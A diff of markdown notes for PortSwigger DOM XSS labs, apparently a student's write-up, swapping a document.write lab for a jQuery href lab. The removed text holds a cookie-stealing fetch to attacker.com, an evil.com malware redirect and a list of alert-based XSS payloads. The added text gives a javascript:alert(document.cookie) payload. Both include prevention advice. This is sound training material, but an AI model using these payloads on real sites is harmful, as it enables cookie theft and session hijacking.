@@ -1,390 +1,190 @@
-# DOM XSS in `document.write` Sink Using Source `location.search`
+# Lab: DOM XSS in jQuery Anchor `href` Attribute Sink Using `location.search`
 
-## 📝 Lab Notes for Revision
 
----
 
-# 1. Lab Overview
+This lab contains a **DOM-based Cross-Site Scripting (DOM XSS)** vulnerability on the **Submit Feedback** page.
 
-| Detail         | Information                                                     |
-| -------------- | --------------------------------------------------------------- |
-| **Lab Name**   | DOM XSS in `document.write` sink using source `location.search` |
-| **Platform**   | PortSwigger Web Security Academy                                |
-| **Difficulty** | APPRENTICE                                                      |
-| **XSS Type**   | DOM-based Cross-Site Scripting                                  |
+The application uses jQuery to locate an anchor (`<a>`) element and dynamically sets its `href` attribute using data taken from `location.search`.
 
----
+Because user-controlled input is inserted into the `href` attribute without validation, an attacker can inject a `javascript:` URL and execute JavaScript when the link is clicked.
 
-# 2. What is This Vulnerability?
+## Objective
 
-## Definition
-
-DOM-based XSS vulnerability where the `document.write` function writes data from `location.search` directly to the page without any sanitization or encoding.
-
-## Affected Components
-
-| Component         | Role                                  |
-| ----------------- | ------------------------------------- |
-| `location.search` | Reads data from URL query string      |
-| `document.write`  | Writes data directly to HTML document |
-
-## Vulnerable Code Example
+Make the **Back** link execute:
 
 ```javascript
-var query = location.search.substring(1);
-
-document.write(
-  "<img src='/resources/images/tracker.gif?searchTerms=" + query + "'>"
-);
+alert(document.cookie)
 ```
+
+to solve the lab.
 
 ---
 
-# 3. Why This is Dangerous
+## Vulnerability Details
 
-## Attack Flow Diagram
+### Source
 
-```text
-User Clicks Malicious Link
-         ↓
-URL contains payload in ?search= parameter
-         ↓
-location.search reads the payload
-         ↓
-document.write writes payload to page
-         ↓
-Browser executes malicious JavaScript
-         ↓
-Attacker achieves: Cookie theft, session hijacking, etc.
-```
-
-## Real-World Impact
-
-| Attack          | Payload Example                                    | Consequence           |
-| --------------- | -------------------------------------------------- | --------------------- |
-| Cookie Stealing | `fetch('https://attacker.com?c='+document.cookie)` | Account takeover      |
-| Keylogging      | `document.addEventListener('keypress',...)`        | Password theft        |
-| Phishing        | `document.body.innerHTML=...`                      | Credential harvesting |
-| Malware         | `window.location='evil.com/virus.exe'`             | System compromise     |
-| Defacement      | `document.body.innerHTML='Hacked'`                 | Reputation damage     |
-
----
-
-# 4. How to Exploit (Step by Step)
-
-## Step 1: Identify the Vulnerability
-
-* Enter random string in search box (e.g., `test123`)
-* Right-click → **Inspect Element**
-* Observe that your input appears inside an `img src` attribute
-
-```html
-<img src="/resources/images/tracker.gif?searchTerms=test123">
-```
-
----
-
-## Step 2: Understand the Context
-
-Your input is inside:
-
-```html
-src="..."
-```
-
-Need to:
-
-1. Break out of the attribute
-2. Close the tag
-3. Inject malicious HTML/JavaScript
-
----
-
-## Step 3: Craft the Payload
-
-```html
-"><svg onload=alert(1)>
-```
-
----
-
-## Step 4: Payload Breakdown
-
-| Character               | Purpose               | Explanation                 |
-| ----------------------- | --------------------- | --------------------------- |
-| `"`                     | Close `src` attribute | Ends `src="..."`            |
-| `>`                     | Close `img` tag       | Ends the `<img>` element    |
-| `<svg onload=alert(1)>` | Inject SVG            | Executes JavaScript on load |
-
----
-
-## Step 5: URL Construction
-
-```text
-https://YOUR-LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
-```
-
----
-
-## Step 6: Execute
-
-* Paste malicious URL in browser
-* Press Enter
-* Alert popup appears ✅
-* Lab solved
-
----
-
-# 5. Alternative Payloads
-
-## Working Payloads
-
-```html
-"><img src=x onerror=alert(1)>
-```
-
-```html
-"><body onload=alert(1)>
-```
-
-```html
-"><script>alert(1)</script>
-```
-
-```html
-" onerror=alert(1) src=x
-```
-
----
-
-## Payloads for Different Contexts
-
-| Context           | Payload                         |
-| ----------------- | ------------------------------- |
-| Inside attribute  | `" onmouseover=alert(1) "`      |
-| Inside JavaScript | `"; alert(1); var x="`          |
-| Inside HTML tag   | `><img src=x onerror=alert(1)>` |
-
----
-
-# 6. Code Analysis (Vulnerable vs Secure)
-
-## Vulnerable Code ❌
+The vulnerable source is:
 
 ```javascript
-// No encoding - DANGEROUS!
-var searchTerm = location.search.split('=')[1];
-
-document.write("<img src='/track?q=" + searchTerm + "'>");
+location.search
 ```
 
-### Why Dangerous?
+This contains user-supplied data from the URL query string.
 
-Attacker can inject:
+### Sink
+
+The vulnerable sink is:
+
+```javascript
+$('a').attr('href', returnPath);
+```
+
+The value of `returnPath` is assigned directly to the anchor's `href` attribute without any sanitization.
+
+---
+
+## Solution
+
+### Step 1: Open the Submit Feedback Page
+
+Navigate to the **Submit Feedback** page.
+
+### Step 2: Test the `returnPath` Parameter
+
+Append a random string to the URL:
+
+```url
+?returnPath=/test123
+```
+
+Example:
+
+```url
+https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=/test123
+```
+
+### Step 3: Inspect the Back Link
+
+Right-click the **Back** link and select **Inspect**.
+
+You will notice that your input has been inserted into the `href` attribute:
 
 ```html
-"><script>...</script>
+<a href="/test123">Back</a>
 ```
 
-and break out of the attribute.
+This confirms that the application is using the `returnPath` parameter to construct the link.
 
----
+### Step 4: Inject a JavaScript URI
 
-## Secure Code ✅
-
-### Method 1: Use `textContent`
+Replace the value of `returnPath` with:
 
 ```javascript
-var searchTerm = location.search.split('=')[1];
-
-document.getElementById("output").textContent = searchTerm;
+javascript:alert(document.cookie)
 ```
 
----
+Resulting URL:
 
-### Method 2: Encode Output
+```url
+https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
+```
+
+### Step 5: Execute the Payload
+
+Press **Enter** to load the page.
+
+Click the **Back** link.
+
+The browser executes:
 
 ```javascript
-var searchTerm = location.search.split('=')[1];
-
-var encoded = encodeURIComponent(searchTerm);
-
-document.write("<img src='/track?q=" + encoded + "'>");
+alert(document.cookie)
 ```
+
+The alert box appears displaying the cookie value, and the lab is successfully solved.
 
 ---
 
-### Method 3: Create Elements Safely
+## Payload
 
 ```javascript
-var searchTerm = location.search.split('=')[1];
+javascript:alert(document.cookie)
+```
 
-var img = new Image();
+## Proof of Concept
 
-img.src = '/track?q=' + encodeURIComponent(searchTerm);
-
-document.body.appendChild(img);
+```url
+?returnPath=javascript:alert(document.cookie)
 ```
 
 ---
 
-### Method 4: Use DOMPurify
+## Why the Attack Works
+
+The application performs the following action:
 
 ```javascript
-var searchTerm = location.search.split('=')[1];
-
-document.write(
-  DOMPurify.sanitize("<img src='/track?q=" + searchTerm + "'>")
-);
+var returnPath = new URLSearchParams(location.search).get('returnPath');
+$('a').attr('href', returnPath);
 ```
 
+Since no validation is applied, an attacker can supply a `javascript:` URL instead of a normal path.
+
+When the victim clicks the link, the browser interprets the value as executable JavaScript and runs it.
+
 ---
 
-# 7. Testing Methodology
+## Impact
 
-## Manual Testing Checklist
+* DOM-Based Cross-Site Scripting (DOM XSS)
+* Arbitrary JavaScript execution
+* Session hijacking
+* Cookie theft
+* User impersonation
+* Phishing attacks
 
-```text
-[ ] Find reflected input
-[ ] Check HTML/attribute context
-[ ] Try breaking out using quotes
-[ ] Inject alert(1)
-[ ] Try event handlers if blocked
-[ ] Document findings
+---
+
+## Prevention
+
+### Validate URLs
+
+Only allow safe protocols:
+
+```javascript
+http:
+https:
 ```
 
----
+### Block Dangerous Schemes
 
-## Test Strings for Different Sinks
+Reject values beginning with:
 
-| Sink             | Test String                    |
-| ---------------- | ------------------------------ |
-| `document.write` | `"><svg onload=alert(1)>`      |
-| `innerHTML`      | `<img src=x onerror=alert(1)>` |
-| `eval()`         | `alert(1)`                     |
-| `setTimeout()`   | `alert(1)`                     |
-| `location.href`  | `javascript:alert(1)`          |
-
----
-
-# 8. Key Concepts to Remember
-
-## Important Terminology
-
-| Term       | Definition                               |
-| ---------- | ---------------------------------------- |
-| Source     | Where user input comes from              |
-| Sink       | Where data is written                    |
-| DOM XSS    | XSS occurring entirely in client-side JS |
-| Taint Flow | Path from source to sink                 |
-
----
-
-## Why DOM XSS is Unique
-
-* Server never sees the payload
-* WAF cannot detect easily
-* Logs may not show attack
-* Client-side protection required
-
----
-
-## Common Sources
-
-| Source              | Data         |
-| ------------------- | ------------ |
-| `location.search`   | Query string |
-| `location.hash`     | Fragment     |
-| `location.href`     | Full URL     |
-| `document.referrer` | Previous URL |
-| `document.cookie`   | Cookies      |
-
----
-
-# 9. Prevention Cheat Sheet
-
-## DO's ✅
-
-| Practice          | Example                           |
-| ----------------- | --------------------------------- |
-| Use `textContent` | `element.textContent = userInput` |
-| Encode output     | `encodeURIComponent(userInput)`   |
-| Safe DOM methods  | `createElement()`                 |
-| Use CSP           | `script-src 'self'`               |
-| Validate input    | Whitelist allowed chars           |
-
----
-
-## DON'Ts ❌
-
-| Dangerous Practice          | Why                   |
-| --------------------------- | --------------------- |
-| `document.write(userInput)` | Direct HTML injection |
-| `innerHTML = userInput`     | XSS risk              |
-| `eval(userInput)`           | JavaScript injection  |
-| `location.href = userInput` | JS protocol injection |
-
----
-
-# 10. Quick Revision Quiz
-
-## Q1: Which function is the sink?
-
-**Answer:** `document.write`
-
----
-
-## Q2: What is the source?
-
-**Answer:** `location.search`
-
----
-
-## Q3: Why use SVG payload?
-
-**Answer:** Need to break out of the `src` attribute and inject executable HTML.
-
----
-
-## Q4: Can WAF detect DOM XSS?
-
-**Answer:** Usually no, because payload executes client-side.
-
----
-
-## Q5: Safe alternatives to `document.write`?
-
-1. `textContent`
-2. `createElement()`
-
----
-
-# 11. Lab Solution Summary
-
-```text
-https://LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
+```javascript
+javascript:
+data:
+vbscript:
 ```
 
----
+### Use a Whitelist
 
-# 12. Key Takeaways
+Allow only predefined application paths:
 
-* DOM XSS executes in browser
-* `document.write` is dangerous
-* `location.search` is user-controlled
-* Context matters in payload crafting
-* Break out before injecting
-* Use safe DOM APIs
-* Encoding is essential
+```javascript
+const allowedPaths = ['/','/home','/contact'];
 
----
+if (allowedPaths.includes(returnPath)) {
+    $('a').attr('href', returnPath);
+}
+```
 
-# 13. Further Practice Resources
+### Implement CSP
 
-| Platform    | Focus                |
-| ----------- | -------------------- |
-| PortSwigger | DOM XSS labs         |
-| XSS Game    | DOM XSS challenges   |
-| TryHackMe   | Interactive practice |
+Use a strict Content Security Policy to reduce XSS impact.
 
 ---
+
+## Lab Status
+
+✅ Solved
